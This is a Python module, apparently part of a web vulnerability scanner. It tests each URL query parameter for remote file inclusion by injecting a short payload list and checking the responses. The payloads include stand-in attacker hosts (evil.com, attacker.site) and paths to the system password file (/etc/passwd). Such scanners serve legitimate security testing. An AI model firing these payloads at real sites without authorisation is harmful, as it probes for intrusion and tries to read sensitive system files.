import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

RFI_PAYLOADS = [
    "http://evil.com",
    "https://attacker.site",
    "//evil.com",
    "/etc/passwd",
    "file:///etc/passwd"
]

def check_rfi(url):
    """Main Remote File Inclusion (RFI) Checking Function."""
    result = {
        "vulnerable": False,
        "vulnerability": "Remote File Inclusion (RFI)",
        "risk": "High",
        "details": []
    }

    headers = {"User-Agent": "Mozilla/5.0"}

    try:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)

        if not query:
            result["details"].append({"note": "No parameters found to test for RFI."})
            return result

        for param in query.keys():
            for payload in RFI_PAYLOADS:
                modified_query = query.copy()
                modified_query[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(modified_query, doseq=True)))

                response = requests.get(test_url, headers=headers, timeout=7)

                # Basic suspicious patterns check
                if "evil.com" in response.text or "root:x" in response.text:
                    result["vulnerable"] = True
                    result["details"].append({
                        "tested_parameter": param,
                        "payload_used": payload,
                        "tested_url": test_url,
                        "reason": "Suspicious file inclusion detected!"
                    })
                    break  # stop after first detection

        if not result["vulnerable"]:
            result["details"].append({"note": "No RFI vulnerabilities detected with basic payloads."})

    except Exception as e:
        result["details"].append({"error": str(e)})

    return result
